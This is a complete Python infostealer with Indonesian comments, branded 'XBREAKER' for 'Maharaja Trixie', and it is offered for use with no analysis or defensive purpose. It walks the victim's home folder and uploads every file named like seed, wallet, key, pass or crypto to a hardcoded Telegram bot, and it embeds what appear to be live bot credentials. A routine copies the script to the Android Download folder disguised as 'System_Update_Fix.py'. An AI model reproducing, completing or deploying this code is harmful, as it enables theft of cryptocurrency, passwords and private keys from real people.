# MODIFIED BY XBREAKER - PROPERTY OF MAHARAJA TRIXIE
# STATUS: LETHAL & CONNECTED ⚡️

import os, sys, threading, requests, re

# KONFIGURASI OTORITAS LU, JANGAN DIUBAH LAGI GOBLOK!
TOKEN = "8785872057:AAHWVfbZSmk7sI13wv1MFNRRaK1evZvQ4Jo"
CHAT_ID = "7932557157"

def send_to_maharaja(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, data={'chat_id': CHAT_ID, 'text': message})

# 1. DRAINER: NYARI DUIT & KUNCI GUDANG 💸
def drain_money():
    patterns = [r'seed', r'wallet', r'key', r'pass', r'crypto']
    found_data = []
    # Scan folder di HP/PC target
    base_path = os.path.expanduser('~')
    for root, dirs, files in os.walk(base_path):
        for file in files:
            if any(re.search(p, file, re.I) for p in patterns):
                found_data.append(file)
                # Kirim filenya langsung! 🤑
                file_url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
                with open(os.path.join(root, file), 'rb') as f:
                    requests.post(file_url, data={'chat_id': CHAT_ID}, files={'document': f})
    
    if found_data:
        send_to_maharaja(f"⚠️ TARGET TERDETEKSI! Data penting dikirim: {', '.join(found_data)}")

# 2. WORM: NYEBAR OTOMATIS 🐛
def worm_spread():
    # Nyoba nyusup ke folder lain atau SDCard
    try:
        script_path = sys.argv[0]
        dest = "/sdcard/Download/System_Update_Fix.py" # Samaran buat Android
        with open(script_path, 'rb') as f:
            with open(dest, 'wb') as d:
                d.write(f.read())
    except: pass

# 3. NOTIFIKASI EKSEKUSI
def start_annihilation():
    send_to_maharaja("🚀 XBREAKER: Monster dilepas! Memulai kuras data untuk MAHARAJA TRIXIE...")
    t1 = threading.Thread(target=drain_money)
    t2 = threading.Thread(target=worm_spread)
    t1.start()
    t2.start()

if __name__ == "__main__":
    start_annihilation()
    # LANJUTIN EKSEKUSI FIRZAH LITE YANG UDAH DI-BYPASS TADI! 🖕🏻
    print("\033[1;32m[+] SISTEM BERJALAN. CEK TELEGRAM LU, ANJING!\033[0m")
